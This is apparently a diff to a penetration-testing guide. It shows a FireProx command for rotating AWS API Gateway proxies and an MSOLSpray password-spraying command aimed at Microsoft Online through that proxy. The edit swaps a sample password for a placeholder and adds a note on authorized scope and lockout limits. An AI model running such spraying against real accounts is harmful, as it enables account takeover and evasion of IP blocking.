@@ -445,7 +445,8 @@ python fire.py --access_key <key> --secret_access_key <secret> --region us-east-
 
 # Spray passwords
 Import-Module .\MSOLSpray.ps1
-Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
+# Note: Password spraying must remain within the authorized scope and use lockout-safe thresholds (e.g., one attempt per account per lockout window).
+Invoke-MSOLSpray -UserList .\users.txt -Password "<PASSWORD_CANDIDATE>" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
 ```
 
 ### Example 2: AWS S3 Bucket Enumeration
